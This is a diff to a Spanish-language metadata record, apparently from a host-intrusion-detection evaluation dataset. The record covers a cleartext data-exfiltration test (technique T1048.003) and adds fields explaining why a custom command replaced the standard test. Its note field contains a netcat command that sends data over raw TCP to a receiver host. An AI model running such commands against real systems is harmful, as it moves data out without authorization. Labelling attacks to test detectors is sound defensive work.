@@ -7,7 +7,7 @@
   "tanda": "C",
   "estado": "cerrado",
   "artefacto": "Dataset/Ataques/Comandos/T1048.003-Unencrypted_Non-C2/",
-  "atomic": { "fuente": "custom", "nota": "exfiltracion EN CLARO por TCP crudo al receptor del HOST (nc.openbsd -N 192.168.65.1 9091). Contraste con ATA019 (simetrico) y ATA041 (asimetrico): el cifrado no cambia lo que ve el HIDS (el proceso). BINARIO REAL: nc -> /usr/bin/nc.openbsd" },
+  "atomic": { "fuente": "custom", "nota": "exfiltracion EN CLARO por TCP crudo al receptor del HOST (nc.openbsd -N 192.168.65.1 9091). Contraste con ATA019 (simetrico) y ATA041 (asimetrico): el cifrado no cambia lo que ve el HIDS (el proceso). BINARIO REAL: nc -> /usr/bin/nc.openbsd", "fuente_norm": "propio", "motivo_codigo": "art_mecanismo_no_coincide", "motivo_detalle": "ART trae pruebas Linux (HTTP/python) que requieren `python3` (punto ciego 92600) o servicios externos; se ejecuta con `nc.openbsd` (TCP crudo) para evitar el punto ciego. Contraste en claro de las variantes cifradas." },
   "esperado_sha256": "54155a899adbbe1f3f991f1e84d447b44d4b9823a5213172e07d3c8d519ddf63",
   "ataque_sha256": "ee9e427b29810e9385b06cf4b1210e11d8299bacca0989833302faa8c1f8e856",
   "validacion_humana_esperado": "APROBADO 2026-09-29",
